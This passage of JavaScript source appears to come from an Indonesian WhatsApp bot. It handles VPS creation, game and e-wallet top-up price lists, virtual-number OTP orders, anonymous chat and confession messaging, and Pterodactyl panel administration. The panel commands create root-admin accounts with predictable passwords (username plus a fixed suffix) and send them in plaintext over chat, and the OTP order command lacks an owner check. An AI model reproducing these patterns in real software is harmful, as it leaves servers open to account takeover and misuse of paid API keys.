method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + global.apiDigitalOcean
},
body: JSON.stringify(dropletData)
});
let responseData = await response.json();
if (!response.ok) {
return m.reply(`Gagal membuat VPS. Pesan error: ${responseData.message || "Tidak diketahui"}`);
}
let dropletId = responseData.droplet.id;
await m.reply("Memproses pembuatan VPS... Perkiraan 1-5 menit.");
await new Promise(resolve => setTimeout(resolve, 60000));
let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Authorization': "Bearer " + global.apiDigitalOcean
}
});
let dropletDetails = await dropletResponse.json();
let ipVPS = dropletDetails.droplet.networks.v4[0]?.ip_address || "Tidak ada alamat IP.";
await Line.sendMessage(m.chat, {
text: `VPS berhasil dibuat!
🛜 ID DROPLET : ${dropletId}
⚙️ IP VPS : ${ipVPS}
📛 Username : root
🗝️ Password : ${password}`
});
} catch (err) {
console.error("Error:", err);
m.reply("Terjadi kesalahan: " + err.message);
}
}
}
break

case 'listmlbb': {
    try {
        const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
        
        // Filter and sort the MLBB top-up options by price
        let mlbb = data.filter(v => /TPG Diamond Mobile Legends/i.test(v.produk) && v.harga > 0);
        mlbb.sort((a, b) => a.harga - b.harga);

        // Create the list of items
        const list = mlbb.map((item, index) => {
            const harga = countProfit(item.harga);
            const status = item.status === "1" ? "Ready" : "Tidak Ready";
            return `${prefix}beli ${item.kode}|IDGame
Nama Produk: ${item.keterangan} \nHarga: ${toRupiah(harga)} \nStatus: ${status}`;
        });

        // Combine the header with the list
        const message = `[ *LIST HARGA PRODUK MLBB* ]
Pastikan ID Game Anda Benar
Contoh : 123456(1234)
Cara Penggunaan: 1234561234\n\n${list.join('\n\n')}`;

        // Send the deposit balance and the MLBB list
        await Line.sendMessage(m.chat, { text: message });
    } catch (error) {
        console.error("Error fetching MLBB data:", error);
        await Line.sendMessage(m.chat, { text: "Terjadi kesalahan saat mengambil data MLBB." });
    }
    return;
}
break; 
case 'liststumble': {
    try {
        const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");

                let stumble = data.filter(v => /TPG Stumble Guys/i.test(v.produk) && v.harga > 0)
                stumble.sort(function(a, b) {
                    return a.harga - b.harga
                })

        // Create the list of items
        const list = stumble.map((item, index) => {
            const harga = countProfit(item.harga);
            const status = item.status === "1" ? "Ready" : "Tidak Ready";
            return `${prefix}beli ${item.kode}|IDGame
Nama Produk: ${item.keterangan} \nHarga: ${toRupiah(harga)} \nStatus: ${status}`;
        });

        // Combine the header with the list
        const message = `[ *LIST HARGA PRODUK STUMBLE* ]\n\n${list.join('\n\n')}`;

        // Send the deposit balance and the STUMBLE list
        await Line.sendMessage(m.chat, { text: message });
    } catch (error) {
        console.error("Error fetching stumble data:", error);
        await Line.sendMessage(m.chat, { text: "Terjadi kesalahan saat mengambil data stumble." });
    }
    return;
}
break; 
case 'listdana': {
    try {
        const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
        
        // Filter and sort the DANA top-up options by price
        const dana = data
            .filter(item => /Top Up Saldo DANA/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        
        // Map through the filtered items to create a formatted list
        const list = dana.map((item, index) => {
            const harga = countProfit(item.harga);
            const status = item.status === "1" ? "Ready" : "Tidak Ready";
            return `${prefix}beli ${item.kode}|${item.keterangan} \nHarga: ${toRupiah(harga)} \nStatus: ${status}`;
        });
        const message = `[ *LIST HARGA PRODUK DANA* ]\n\n${list.join('\n\n')}`;
        // Send the deposit balance and the DANA list
        await Line.sendMessage(m.chat, {
            text: message
        });
    } catch (error) {
        console.error("Error fetching DANA data:", error);
        await Line.sendMessage(m.chat, { text: "Terjadi kesalahan saat mengambil data DANA." });
    }
    return;
}
break;
case 'listhok': {
    try {
        const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
            let hok = data.filter(v => /TPG Honor of Kings/i.test(v.produk) && v.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        const list = hok.map((item, index) => {
            const harga = countProfit(item.harga);
            const status = item.status === "1" ? "Ready" : "Tidak Ready";
            return `${prefix}beli ${item.kode}| ${index + 1} ${item.keterangan} \nHarga: ${toRupiah(harga)} \nStatus: ${status}`;
        });
        const message = `[ *LIST HARGA PRODUK HOK* ]\n\n${list.join('\n\n')}`;
        await Line.sendMessage(m.chat, {
            text: message
        });
    } catch (error) {
        console.error("Error fetching HOK data:", error);
        await Line.sendMessage(m.chat, { text: "Terjadi kesalahan saat mengambil data HOK." });
    }
    return;
}
break;  
case 'listvalorant': {
    try {
        const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");

                let valoran = data.filter(v => /TPG Valorant Points/i.test(v.produk) && v.harga > 0)
                valoran.sort(function(a, b) {
                    return a.harga - b.harga
                })


        const list = valoran.map((item, index) => {
            const harga = countProfit(item.harga);
            const status = item.status === "1" ? "Ready" : "Tidak Ready";
            return `${prefix}beli ${item.kode}|IDGame
Nama Produk: ${item.keterangan} \nHarga: ${toRupiah(harga)} \nStatus: ${status}`;
        });

        // Combine the header with the list
        const message = `[ *LIST HARGA PRODUK VALORAN* ]\n\n${list.join('\n\n')}`;

        await Line.sendMessage(m.chat, { text: message });
    } catch (error) {
        console.error("Error fetching Valoran data:", error);
        await Line.sendMessage(m.chat, { text: "Terjadi kesalahan saat mengambil data Valoran." });
    }
    return;
}
break;   
case 'listfreefire': {
    try {
        const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");

                let ff = data.filter(v => /TPG Diamond Free Fire/i.test(v.produk) && v.harga > 0)
                ff.sort(function(a, b) {
                    return a.harga - b.harga
                })


        const list = ff.map((item, index) => {
            const harga = countProfit(item.harga);
            const status = item.status === "1" ? "Ready" : "Tidak Ready";
            return `${prefix}beli ${item.kode}|IDGame
Nama Produk: ${item.keterangan} \nHarga: ${toRupiah(harga)} \nStatus: ${status}`;
        });

        // Combine the header with the list
        const message = `[ *LIST HARGA PRODUK FREEFIRE* ]\n\n${list.join('\n\n')}`;

        await Line.sendMessage(m.chat, { text: message });
    } catch (error) {
        console.error("Error fetching freefire data:", error);
        await Line.sendMessage(m.chat, { text: "Terjadi kesalahan saat mengambil data freefire." });
    }
    return;
}
break;         
case 'listpubg': {
    try {
        const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");

                let pubg = data.filter(v => /TPG Game Mobile PUBG/i.test(v.produk) && v.harga > 0)
                pubg.sort(function(a, b) {
                    return a.harga - b.harga
                })


        const list = pubg.map((item, index) => {
            const harga = countProfit(item.harga);
            const status = item.status === "1" ? "Ready" : "Tidak Ready";
            return `${prefix}beli ${item.kode}|IDGame
Nama Produk: ${item.keterangan} \nHarga: ${toRupiah(harga)} \nStatus: ${status}`;
        });

        // Combine the header with the list
        const message = `[ *LIST HARGA PRODUK PUBG* ]\n\n${list.join('\n\n')}`;

        await Line.sendMessage(m.chat, { text: message });
    } catch (error) {
        console.error("Error fetching pubg data:", error);
        await Line.sendMessage(m.chat, { text: "Terjadi kesalahan saat mengambil data pubg." });
    }
    return;
}
break; 
case 'listgopay': {
    try {
        const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");

                let gopay = data.filter(v => /Top Up Saldo GO-JEK Customer/i.test(v.produk) && v.harga > 0)
                gopay.sort(function(a, b) {
                    return a.harga - b.harga
                })


        const list = gopay.map((item, index) => {
            const harga = countProfit(item.harga);
            const status = item.status === "1" ? "Ready" : "Tidak Ready";
            return `${prefix}beli ${item.kode}|Nomor Pelanggan
Nama Produk: ${item.keterangan} \nHarga: ${toRupiah(harga)} \nStatus: ${status}`;
        });

        // Combine the header with the list
        const message = `[ *LIST HARGA PRODUK GOPAY* ]\n\n${list.join('\n\n')}`;

        await Line.sendMessage(m.chat, { text: message });
    } catch (error) {
        console.error("Error fetching gopay data:", error);
        await Line.sendMessage(m.chat, { text: "Terjadi kesalahan saat mengambil data gopay." });
    }
    return;
}
break; 
case 'listaxis': {
    try {
        const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");

                let ff = data.filter(v => /Axis/i.test(v.produk) && v.harga > 0)
                ff.sort(function(a, b) {
                    return a.harga - b.harga
                })


        const list = ff.map((item, index) => {
            const harga = countProfit(item.harga);
            const status = item.status === "1" ? "Ready" : "Tidak Ready";
            return `${prefix}beli ${item.kode}|Nomor
Nama Produk: ${item.keterangan} \nHarga: ${toRupiah(harga)} \nStatus: ${status}`;
        });

        // Combine the header with the list
        const message = `[ *LIST HARGA PRODUK AXIS* ]\n\n${list.join('\n\n')}`;

        await Line.sendMessage(m.chat, { text: message });
    } catch (error) {
        console.error("Error fetching axis data:", error);
        await Line.sendMessage(m.chat, { text: "Terjadi kesalahan saat mengambil data axis." });
    }
    return;
}
break; 
case 'listtri': {
    try {
        const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");

                let ff = data.filter(v => /Three/i.test(v.produk) && v.harga > 0)
                ff.sort(function(a, b) {
                    return a.harga - b.harga
                })


        const list = ff.map((item, index) => {
            const harga = countProfit(item.harga);
            const status = item.status === "1" ? "Ready" : "Tidak Ready";
            return `${prefix}beli ${item.kode}|Nomor
Nama Produk: ${item.keterangan} \nHarga: ${toRupiah(harga)} \nStatus: ${status}`;
        });

        // Combine the header with the list
        const message = `[ *LIST HARGA PRODUK THREE* ]\n\n${list.join('\n\n')}`;

        await Line.sendMessage(m.chat, { text: message });
    } catch (error) {
        console.error("Error fetching three data:", error);
        await Line.sendMessage(m.chat, { text: "Terjadi kesalahan saat mengambil data Three." });
    }
    return;
}
break
case 'listp': {
let tex = reply(`
┏━ ⊑ *List Produk* ⊒
┃ listdana
┃ listgopay
┃ listfreefire
┃ listmlbb
┃ listpubg
┃ listvalorant
┃ listhok
┃ liststumble
┃ listaxis
┃ listtri
┗━━━━━━━━━━━━━━`)
Line.sendMessage(m.chat, { text : tex })
}
break
// Nokos 

case "orderotp": {
if (!isOwner) return onlyOwn()
const response = await axios.get(`https://virtusim.com/api/v2/json.php?api_key=${apiKey}&action=services&country=philippines`);
if (response.data.status) {
let reply = 'Daftar Layanan OTP:\n';
response.data.data.forEach(service => {
reply += `ID: ${service.id} - ${service.name} - Harga: ${service.price}\n`;
});
await Line.sendMessage(m.chat, { text: reply }, { quoted: m });
} else {
await Line.sendMessage(m.chat, { text: 'Gagal mendapatkan daftar layanan OTP.' }, { quoted: m });
}
}
break;

case "pesanotp": {
const serviceId = args[0];
const operator = args[1] || 'any';
const response = await axios.get(`https://virtusim.com/api/v2/json.php?api_key=${apiKey}&action=order&service=${serviceId}&operator=${operator}`);
if (response.data.status) {
const data = response.data.data;
await Line.sendMessage(m.chat, {
text: `Nomor berhasil dipesan!\nNomor: +${data.number}\nOperator: ${data.operator}\nID Layanan: ${data.service_id}`,
}, { quoted: m });
} else {
await Line.sendMessage(m.chat, { text: `${response.data.data.msg || ''}` }, { quoted: m });
}
}
break;


case "cekstatusotp": {
if (!isOwner) return onlyOwn()
const orderId = args[0];
const response = await axios.get(`https://virtusim.com/api/v2/json.php?api_key=${apiKey}&action=status&id=${orderId}`);
if (response.data.status) {
const data = response.data.data;
await Line.sendMessage(m.chat, {
text: `Status Order:\nID: ${data.id}\nStatus: ${data.status}\nNomor: ${data.number}\nLayanan: ${data.service_name}`,
}, { quoted: m });
} else {
await Line.sendMessage(m.chat, { text: `Gagal mengecek status order. ${response.data.data.msg || ''}` }, { quoted: m });
}
}
break;

case "ubahstatusotp": {
if (!isOwner) return onlyOwn()
const orderId = args[0];
const status = args[1];
if (!orderId || !status || !["1", "2"].includes(status)) {
return Line.sendMessage(m.chat, { text: "Penggunaan: !ubahstatusotp <Order ID> <1 (Ready) atau 2 (Cancel)>" }, { quoted: m });
}
try {
const response = await axios.get(`https://virtusim.com/api/v2/json.php?api_key=${apiKey}&action=set_status&id=${orderId}&status=${status}`);
if (response.data.status) {
const data = response.data.data;
await Line.sendMessage(m.chat, {
text: `Status nomor berhasil diubah!\nID: ${data.id}\nNomor: ${data.number}\nLayanan: ${data.service_name}\nStatus Baru: ${status === "1" ? "Ready" : "Cancel"}`,
}, { quoted: m });
} else {
await Line.sendMessage(m.chat, { text: `Gagal mengubah status nomor. Pesan: ${response.data.msg || 'Tidak ada pesan'}` }, { quoted: m });
}
} catch (error) {
console.error('Error:', error.message); // Logging error jika terjadi masalah
await Line.sendMessage(m.chat, { text: 'Gagal mengubah status nomor karena kesalahan koneksi.' }, { quoted: m });
}
}
break

case "cekorderotp": {
if (!isOwner) return onlyOwn()
try {
const response = await axios.get(`https://virtusim.com/api/v2/json.php?api_key=${apiKey}&action=active_order`);
console.log(response.data); // Log response untuk debugging
if (response.data.status) {
let reply = 'Daftar Order OTP Aktif:\n';
response.data.data.forEach(order => {
reply += `ID: ${order.id}\nStatus: ${order.status}\nNomor: ${order.number}\nOTP: ${order.otp || 'Menunggu SMS'}\nLayanan: ${order.service_name}\n\n`;
});
await Line.sendMessage(m.chat, { text: reply }, { quoted: m });
} else {
await Line.sendMessage(m.chat, { text: `Gagal mendapatkan daftar order aktif. Pesan: ${response.data.data.msg || 'Tidak ada pesan'}` }, { quoted: m });
}
} catch (error) {
console.error('Error:', error.message); // Log error jika terjadi masalah
await Line.sendMessage(m.chat, { text: 'Gagal mendapatkan daftar order aktif karena kesalahan koneksi.' }, { quoted: m });
}
}
break

// === Menfes Menu

case 'anonymous':
case 'anonymouschat': {
if (!isPc) return onlyPrivat()
m.reply(`Hai ${db.data.users[m.sender].nama} selamat datang di Anonymous chat!\n\nKetik ${prefix}start untuk memulai sesi chat`)
 }
break

case 'start':
case 'mulai': {
if (!isPc) return onlyPrivat()
this.anonymous = this.anonymous ? this.anonymous : {}
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
m.reply(`Kamu masih berada di dalam sesi Anonymous!\n\n${prefix}leave untuk keluar dari sesi chat`)
return false
}
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
Line.sendMessage(room.a, {text: `Berhasil menemukan partner. Sekarang kamu dapat mengirim pesan!\n\n${prefix}skip untuk mencari partner lain\n${prefix}leave untuk menghentikan sesi chat`})
room.b = m.sender
room.state = 'CHATTING'
m.reply(`Berhasil menemukan partner. Sekarang kamu dapat mengirim pesan!\n\n${prefix}skip untuk mencari partner lain\n${prefix}leave untuk menghentikan sesi chat`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
m.reply(`Menunggu partner...`)
}}
break

case 'leave':
case 'keluar': {
if (!isPc) return onlyPrivat()
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!room) {
m.reply(`Kamu sedang tidak berada di sesi Anonymous!\n\n${prefix}start untuk memulai sesi chat`)
return false
}
m.reply('Berhasil keluar dari Anonymous chat!')
let other = room.other(m.sender)
if (other) await Line.sendText(other, `Partner telah meninggalkan sesi Anonymous!`, m)
delete this.anonymous[room.id]
if (command === 'leave') 
break
}
break

case 'skip':
case 'next':
case 'lanjut': {
if (!isPc) return onlyPrivat()
this.anonymous = this.anonymous ? this.anonymous : {}
let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romeo) {
m.reply(`Kamu sedang tidak berada di sesi Anonymous!\n\n${prefix}start untuk mencari partner`)
return false
}
let other = romeo.other(m.sender)
if (other) await Line.sendText(other, `Partner telah meninggalkan sesi Anonymous!`, m)
delete this.anonymous[romeo.id]
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
Line.sendMessage(room.a, {text: `Berhasil menemukan partner. Sekarang kamu dapat mengirim pesan!\n\n${prefix}skip untuk mencari partner lain\n${prefix}leave untuk menghentikan sesi chat`})
room.b = m.sender
room.state = 'CHATTING'
m.reply(`Berhasil menemukan partner. Sekarang kamu dapat mengirim pesan!\n\n${prefix}skip untuk mencari partner lain\n${prefix}leave untuk menghentikan sesi chat`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
m.reply(`Menunggu partner...`)
}}
break

case 'confess': 
case 'menfess': {
this.menfes = this.menfes ? this.menfes : {}
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (roof) return m.reply('Kamu masih berada didalam sesi menfess!')
if (!isPc) return onlyPrivat()
if (!text) return m.reply(`Contoh: ${prefix+command} nama 628xxx Woy`)
if (!text.includes(' ')) return m.reply(`Contoh: ${prefix+command} nama 628xxx Woy`)
let [namaNya, nomorNya, pesanNya] = text.split` `
if (nomorNya.startsWith('0')) return m.reply(`Contoh: ${prefix+command} nama 628xxx Woy`)
if(isNaN(nomorNya)) return m.reply(`Contoh: ${prefix+command} nama 628xxx Woy`)
var yoi = `Dari: ${namaNya}\nPesan: ${pesanNya}\n\nKlik *Balasmenfes* untuk menerima menfess\nKlik *Tolakmenfess* untuk menolak menfess`
let id = m.sender
this.menfes[id] = {
id,
a: m.sender,
b: nomorNya + "@s.whatsapp.net",
state: 'WAITING'
}
buton = `{\"display_text\":\"Balas Menfess\",\"id\":\"${prefix}balasmenfess\"}`
butoff = `{\"display_text\":\"Tolak Menfess\",\"id\":\"${prefix}tolakmenfess\"}`
quickreply2(nomorNya + '@s.whatsapp.net', `Hi, ada yang menfess nih buat kamu!`, buton, butoff, m)
m.reply('Pesan berhasil dikirim ke nomer tujuan! Moga dibales yaa...')
}
break

case 'balasconfess':
case 'balasmenfess': {
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return m.reply("Belum ada sesi menfess sebelumnya!")
find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find.b = m.sender
find.state = 'CHATTING'
this.menfes[find.id] = {...find}
await Line.sendMessage(other, {text: `@${m.sender.split("@")[0]} telah menerima menfess mu, sekarang kamu bisa chatan lewat bot ini!\n\n*NOTE:* Ketik ${prefix}stopmenfess untuk stop`, mentions: [m.sender]})
Line.sendMessage(m.chat, {text: `Menfess telah siterima, sekarang kamu bisa chatan lewat bot ini!\n\n*NOTE:* Ketik ${prefix}stopmenfess untuk stop`})
}
break

case 'tolakconfess':
case 'tolakmenfess': {
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return m.reply("Belum ada sesi menfess aebelumnya!")
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
Line.sendMessage(other, {text: `${m.sender.split("@")[0]} menolak menfess dari mu...`, mentions: [m.sender]})
// await Line.sendMessage(find.a, {text: `_Uppsss... @${find.b.split("@")[0]} Menolak menfess kamu_`,mentions: [find.b]})
m.reply('Menfess berhasil ditolak!')
delete this.menfes[roof.id]
}
break

case 'stopconfess':
case 'stopmenfess': {
 //find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
find = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!find) return m.reply("Belum ada sesi menfess sebelumnya!")
const to = find.a == m.sender ? find.b : find.a
Line.sendMessage(to, {text: `Teman chat telah menghentikan menfess ini...`, mentions:[m.sender]})
await m.reply('Menfess berhasil distop!')
delete this.menfes[find.id]
}
break

// === Cpanel Menu

case "listpanel": case "listp": case "listserver": {
if (!isOwner && !isReseller) return onlyOr();
let page = args[0] && !isNaN(args[0]) ? parseInt(args[0]) : 1;
let f = await fetch(`${global.domain}/api/application/servers?page=${page}`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot di halaman ini");
let messageText = `\n*#- List Server Panel Pterodactyl*\n`;
for (let server of servers) {
let s = server.attributes;
let f3 = await fetch(`${global.domain}/api/client/servers/${s.uuid.split`-`[0]}/resources`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
});
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n*ID:* ${s.id}\n`;
messageText += `*Nama:* ${s.name}\n`;
messageText += `*RAM:* ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().slice(0, 2) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}\n`;
messageText += `*CPU:* ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu + "%"}\n`;
messageText += `*Disk:* ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.toString().length > 3 ? s.limits.disk.toString().slice(0, 2) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}\n`;
messageText += `*Created:* ${s.created_at.split("T")[0]}\n\n`;
}
messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total: ${res.meta.pagination.count} server\n`;
await Line.sendMessage(m.chat, { text: messageText }, { quoted: m });
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`Ketik *${prefix + command} ${res.meta.pagination.current_page + 1}* untuk melihat halaman selanjutnya.`);
}
}
break

case 'delserver': {
if (!isOwner && !isReseller) return onlyOr()
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(`${global.domain}` + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('Server tidak ditemukan!')
m.reply('Sukses menghapus server!')
}
break

case 'listuser': {
if (!isOwner && !isReseller) return onlyOr()
let page = args[0] ? args[0] : '1';
let f = await fetch(`${global.domain}` + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let users = res.data;
let messageText = "Berikut list user nya:\n\n";
for (let user of users) {
let u = user.attributes;
messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Tidak aktif' : 'Aktif'}\n`;
messageText += `${u.username}\n`;
messageText += `${u.first_name} ${u.last_name}\n\n`;
}
messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total user: ${res.meta.pagination.count}`;
await Line.sendMessage(m.chat, { text: messageText }, { quoted: m });
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`Contoh: ${prefix+command} ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya`);
}
}
break

case 'deluser': {
if (!isOwner && !isReseller) return onlyOr()
let usr = args[0]
if (!usr) return m.reply('ID nya mana?')
let f = await fetch(`${global.domain}` + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('User tidak ditemukan!')
m.reply('Sukses menghapus user!')
}
break

case 'addadmin': {
if (!isOwner) return onlyOwn()
let t = text.split(',');
if (t.length < 3) return m.reply(`Contoh: ${prefix+command} email,username,name,nomor`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`Contoh: ${prefix+command} email,username,name,nomor`);
let d = (await Line.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username +"admin"
let f = await fetch(`${global.domain}` + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
m.reply(`${monospace("BERHASIL  CADMIN!")}
• ID: ${user.id}
• UUID: ${user.uuid}
• Email: ${user.email}

Data lainnya sudah terkirim ke
privat chat...`)
let teksnyo = `*BERIKUT DATA ADMIN PANEL ANDA* 

• ID: ${user.id}
• UUID: ${user.uuid}
• Email: ${user.email}
• Username: ${user.username}
• Password: ${password.toString()}
• Login: ${global.domain}

Simpan data admin panel baik-baik`
await Line.sendMessage(u, { text: teksnyo, quoted: m });
}
break

case "adminpanel": {
if (!isOwner) return reply('Khusus Owner')
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(`${global.domain}` + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let tks = `
TYPE: user
📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}
🖥️LOGIN: ${global.domain}
`
const listMessage = {
text: tks,
}
await Line.sendMessage(m.chat, listMessage)
await Line.sendMessage(nomornya, {
text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n
👤USERNAME :  ${username}
🔑PASSWORD: ${password}
🌐LOGIN: ${global.domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
`,
})
}
break
case "claimadmin": {
if (!isOwner && !isPremium) return reply('Khusus Owner & Premium')
if (!text) return reply('Nama')
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = kapital(args[0])
let password = username+"myadmin"
let f = await fetch(`${global.domain}` + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let teks = `
[ *BERIKUT DATA AKUN ADMIN ANDA* ]

🆔 *ID*: ${user.id}
📧 *Email*: ${email}
👤 *Nama*: ${user.first_name}
🔐 *Password*: ${password}
🌐 *Login:* ${global.domain}
⌛ *Created*: ${user.created_at.split("T")[0]}
🌐 *Admin*: *True✅*
👤 *Username*: ${username}
`
let u = m.sender;

await Line.sendMessage(u, { text: teks, quoted: m });

await reply(`*[ BERHASIL MEMBUAT ]*

📆 *Tanggal*: ${penghitung}
📧 *Status*: *Berhasil✅*

*Detail username "${username}" telah dikirim ke chat pribadi Anda.*
`)
}
break

case 'addemail': {
if (!isOwner) return reply('Perintah ini hanya bisa digunakan oleh Owner.');
const emailToAdd = args[0];
if (!emailToAdd || !emailToAdd.includes('@')) {
return reply('⚠️ Format email tidak valid. Contoh: addemail emailmu@gmail.com');
}
if (whitelistEmails.includes(emailToAdd)) {
return reply(`⚠️ Email "${emailToAdd}" sudah ada di whitelist.`);
}
whitelistEmails.push(emailToAdd);
saveWhitelist(whitelistEmails); 
return reply(`✅ Email "${emailToAdd}" berhasil ditambahkan ke whitelist.`);
}
break

case 'deleteemail': 
case 'deletemail': {
if (!isOwner) return reply('Perintah ini hanya bisa digunakan oleh Owner.');
const emailToDelete = args[0]; 
   if (!emailToDelete) return reply('⚠️ Harap berikan email yang ingin dihapus dari whitelist. Contoh: `deleteemail emailmu@gmail.com`');
const whitelistEmails = loadWhitelist();
if (!whitelistEmails.includes(emailToDelete)) {
return reply(`⚠️ Email \`${emailToDelete}\` tidak ditemukan dalam whitelist.`);
}
const updatedWhitelist = whitelistEmails.filter(email => email !== emailToDelete);
saveWhitelist(updatedWhitelist);
reply(`✅ Email \`${emailToDelete}\` berhasil dihapus dari whitelist.`);
break;
}
break

case 'listemail': {
if (!isOwner) return reply('Perintah ini hanya bisa digunakan oleh Owner.');
const whitelistEmails = loadWhitelist();
if (whitelistEmails.length === 0) {
return reply('⚠️ Tidak ada email dalam daftar whitelist.');
}
let message = `📋 *Daftar Email Whitelist*\n\n`;
whitelistEmails.forEach((email, index) => {
message += `${index + 1}. ${email}\n`;
});
return reply(message);
}
break

